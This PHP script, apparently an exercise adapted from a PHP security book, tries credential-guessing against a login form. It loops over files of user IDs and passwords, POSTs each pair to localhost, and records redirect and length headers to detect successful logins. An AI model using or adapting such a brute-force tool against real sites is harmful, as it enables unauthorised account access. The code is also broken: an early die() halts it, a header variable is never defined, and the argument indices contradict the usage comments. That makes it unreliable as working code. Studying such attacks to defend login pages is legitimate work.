<?php
/*
 * Based on Chris Shiflett, Essential PHP Security, 2005, O'Reilly
 * Chapter 7
 */

/*
if (count($argv) != 5) {
    $s = "php bruteforce_hash_vertify.php -- localhost urlpath userids passwords results\n";
    $s .= "the latter three being filenames\n";
    die($s);
}
*/

//5 argv
//php bruteforce_hash_vertify.php -- darkpwds.txt password_hashed.txt darkresults.txt

foreach($argv as $value)
{
    echo "$value\n";
}



die();



$host = $argv[2];
$url = $argv[3];
$ids = file_get_contents($argv[4]);
$idsa = explode("\r\n", $ids);
$pwds = file_get_contents($argv[5]);
$pwdsa = explode("\r\n", $pwds);
$results = $argv[6];




$s = '';
foreach($idsa as $uid) {
    foreach($pwdsa as $pwd) {
        $content  = 'user=';
        $content .= $uid;
        $content .= '&password=';
        $content .= $pwd;
        $request = $http_header . $content;
        $request = sprintf($request, strlen($content));
        $response = '';

        if ($handle = fsockopen('localhost', 80)) {
            fputs($handle, $request);
            while (!feof($handle)) {
                $response .= fgets($handle, 1024);
            }
            fclose($handle);
            /* Check response */
            var_dump($response);
            preg_match('/Location: \S+/', $response, $m, PREG_OFFSET_CAPTURE);
            if (count($m))
                $s .= sprintf("\n%s %s", $content, $m[0][0]);
            preg_match('/Content-Length: \d+/', $response, $m, PREG_OFFSET_CAPTURE);
            if (count($m))
                $s .= sprintf("\n%s %s", $content, $m[0][0]);
        } else {
            /* Error in sockopen */
            die("WTF");
        }
        file_put_contents($results, $s);
    }
}
echo "\n";
?>